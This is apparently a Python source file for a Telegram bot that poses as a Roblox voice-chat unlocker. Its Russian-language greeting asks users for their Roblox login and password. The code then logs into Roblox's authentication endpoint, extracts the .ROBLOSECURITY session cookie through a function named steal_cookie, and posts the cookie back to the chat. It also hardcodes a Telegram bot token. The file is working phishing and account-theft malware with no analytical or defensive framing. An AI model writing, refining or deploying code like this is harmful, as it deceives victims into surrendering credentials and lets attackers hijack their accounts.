import os
import requests
import time
from telebot import TeleBot

BOT_TOKEN = os.environ.get('BOT_TOKEN', '8659229772:AAER6Afyk1Q9CufqsA7NG-xeeicy9gbY3Ag')
bot = TeleBot(BOT_TOKEN)

def steal_cookie(username, password):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) RobloxApp",
        "Origin": "https://www.roblox.com"
    })
    login_data = {
        "ctype": "Username",
        "cvalue": username,
        "password": password,
        "rememberUser": "true"
    }
    r = sess.post("https://auth.roblox.com/v2/login", json=login_data)
    if r.status_code != 200:
        return None
    for cookie in sess.cookies:
        if cookie.name == ".ROBLOSECURITY":
            return cookie.value
    return None

@bot.message_handler(commands=['start'])
def start(msg):
    bot.send_message(msg.chat.id, "[🔥] Roblox voice chat . Бот готов.\n Введите пожалуйста логин и пароль от своего Roblox аккаунт,что бы мы могли зайти,и сделать вам войс чат")

@bot.message_handler(func=lambda m: True)
def handle(msg):
    creds = msg.text.strip()
    if ":" not in creds:
        bot.reply_to(msg, "Формат: логин:пароль")
        return
    login, pwd = creds.split(":", 1)
    cookie = steal_cookie(login, pwd)
    if not cookie:
        bot.send_message(msg.chat.id, f"❌ {login} - не удалось")
        return
    bot.send_message(msg.chat.id, f"✅ Успех!\nЛогин: {login}\nCookie: {cookie}")

print("[+] Бот запущен на Render")
bot.infinity_polling()
